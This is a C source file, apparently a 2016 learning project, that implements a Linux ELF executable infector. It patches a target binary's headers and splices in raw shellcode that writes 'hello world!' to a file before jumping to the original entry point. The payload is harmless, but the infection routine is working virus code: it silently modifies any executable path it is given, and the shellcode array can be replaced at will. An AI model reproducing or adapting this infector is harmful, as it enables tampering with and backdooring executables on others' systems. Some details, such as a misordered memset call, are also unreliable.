/*=============================================================================
#     FileName: infect.c
#         Desc: infect linux elf files  
#       Author: LiChenda
#        Email: lichenda1996@gmail.com
#     HomePage: https://github.com/LiChenda
#      Version: 0.0.1
#   LastChange: 2016-04-22 10:40:15
#      History:
============================================================================*/
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <elf.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>

#define PAGESIZE 4096

/*binary code to insert*/
unsigned char binarycode[] = 
{
  /*0x00, 0x00, 0x00, 0x00, //4 blank bytes*/
  0xb8, 0x08, 0x00, 0x00, 0x00, 0xbb, 0xb7, 0x00, 
  0x40, 0x00, 0xb9, 0xa4, 0x01, 0x00, 0x00, 0xcd,
  0x80, 0x89, 0xc3, 0xb8, 0x04, 0x00, 0x00, 0x00, 
  0xb9, 0xc4, 0x00, 0x40, 0x00, 0xba, 0x0d, 0x00,
  0x00, 0x00, 0xcd, 0x80, 0xb8, 0x06, 0x00, 0x00,
  0x00, 0xcd, 0x80, 0x48, 0xb8, 0xb7, 0x00, 0x40,
  0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0, 0x2e,
  0x2f, 0x6f, 0x75, 0x74, 0x70, 0x75, 0x74, 0x2e,
  0x74, 0x78, 0x74, 0x00, 0x68, 0x65, 0x6c, 0x6c,
  0x6f, 0x20, 0x77, 0x6f, 0x72, 0x6c, 0x64, 0x21,
  0x0a, 0x00, 0x2e, 0x73, 0x68, 0x73, 0x74, 0x72,
  0x74, 0x61, 0x62, 0x00, 0x2e, 0x74, 0x65, 0x78,
  0x74, 0x00, 
  /* see assembly code in insertcode.asm*/
  
};

/*sizeof inserted binnary code*/
unsigned long bcSize = sizeof(binarycode);
/*unsigned long bcSize = 0;*/

/*jmp point in inserted code */
int filepoint = 6;
int textpoint = 25;
int jmppoint = 45; 

int infect(char *elffile);


int infect(char *elffile)
{
  int re;       /*for function read()'s return value*/
  int fileD;    /*file deicriper8*/
  Elf64_Addr oldEntry; /*old entry point*/
  Elf64_Off oldShoff; /*old section header table file offset*/
  Elf64_Off oldPhsize;
  int i;
  Elf64_Ehdr elfh;
  Elf64_Phdr Phdr;
  Elf64_Shdr Shdr;

  /*open original file*/
  fileD = open(elffile, O_RDWR);
  /*read elf header to elfh*/
  read(fileD, &elfh, sizeof(elfh)); 
  /*compare magic number and other info*/
  if(strncmp((char*)elfh.e_ident, ELFMAG, SELFMAG))
  {
    printf("magic number error\n");
    exit(0);
  }

  oldEntry = elfh.e_entry;
  oldShoff = elfh.e_shoff;

  /*modify 'mov eax oldEntry'*/
  *(Elf64_Addr*)&binarycode[jmppoint] = oldEntry;

  /*increase e_shoff by page size*/
  elfh.e_shoff += PAGESIZE;
  if(bcSize > (PAGESIZE - (elfh.e_entry % PAGESIZE)))
  {
    printf("insert code size too large\n");
    exit(0);
  }

  /*read and modify program headers*/
  int Noff = 0; /**/
  for (i = 0; i < elfh.e_phnum; ++i)
  {
    /*seek and read program header*/
    lseek(fileD, elfh.e_phoff + i * elfh.e_phentsize, SEEK_SET);
    read(fileD, &Phdr, sizeof(Phdr));
    if(Noff)
    { /*program headers after insertion*/

      //increase p_offset by PAGESIZE
      Phdr.p_offset += PAGESIZE;

      //wirte back
      lseek(fileD, elfh.e_phoff + i * elfh.e_phentsize, SEEK_SET);
      write(fileD, &Phdr, sizeof(Phdr));

    }
    else if(Phdr.p_type == PT_LOAD && Phdr.p_offset == 0)
    { /*PT_LOAD: loadable program segment*/
      /*printf("log :%d\n", i);*/
      
      if(Phdr.p_filesz != Phdr.p_memsz)
      {
        printf("p_filesz do not match p_memsz\n");
        exit(0);
      }
      /*modify new entry point and write back*/
      elfh.e_entry = Phdr.p_vaddr + Phdr.p_filesz;// + 4;

      *(int*)&binarycode[filepoint] = elfh.e_entry + 0xb7 - 0x80;
      *(int*)&binarycode[textpoint] = elfh.e_entry + 0xc4 - 0x80;

      lseek(fileD, 0, SEEK_SET);

      write(fileD, &elfh, sizeof(elfh));
      oldPhsize = Phdr.p_filesz;
      Noff = Phdr.p_offset + Phdr.p_filesz;

      /*increase p_filesz and p_memsz by account of insert code*/
      Phdr.p_filesz += bcSize;
      Phdr.p_memsz += bcSize;

      /*write back new program header*/
      lseek(fileD, elfh.e_phoff + i * elfh.e_phentsize, SEEK_SET);
      write(fileD, &Phdr, sizeof(Phdr));

    }

  }

  /*read and modify section header*/
  lseek(fileD, oldShoff, SEEK_SET);
  for (i = 0; i < elfh.e_shnum; ++i)
  {
    lseek(fileD, oldShoff + i * sizeof(Shdr), SEEK_SET);
    re = read(fileD, &Shdr, sizeof(Shdr));
    if(i == 1)
    {
      /*for the lash shdr in the text segment*/
      /*in crease sh_size by bcSize*/
      Shdr.sh_size += bcSize;
    }
    else if(i != 0)
    {
      /*increase sh_offset by PAGESIZE for each */
      /*section header whoes resides after the insertion */
      Shdr.sh_offset += PAGESIZE;
    }
    /*write back*/
    lseek(fileD, oldShoff + i * sizeof(Shdr), SEEK_SET);
    write(fileD, &Shdr, sizeof(Shdr));
    
  }

  /*get file size*/
  struct stat filestat;
  fstat(fileD, &filestat);


  /*data for storing file data after the insertion point*/
  char *data = NULL;
  data = (char*)malloc(filestat.st_size - oldPhsize);
  lseek(fileD, oldPhsize, SEEK_SET);
  read(fileD, data, filestat.st_size - oldPhsize);
  
  /*write inserted code to file */
  lseek(fileD, oldPhsize, SEEK_SET);
  write(fileD, binarycode, sizeof(binarycode));
  /*pad a full page*/
  char tmp[PAGESIZE] = {0};
  memset(tmp, PAGESIZE - bcSize, 0);
  write(fileD, tmp, PAGESIZE - bcSize);

  /*write back data after the insert point*/
  write(fileD, data, filestat.st_size - oldPhsize);

  free(data);
  return 0;

}

int main(int argc, char *argv[])
{
  
  infect(argv[1]);
  return 0;
}
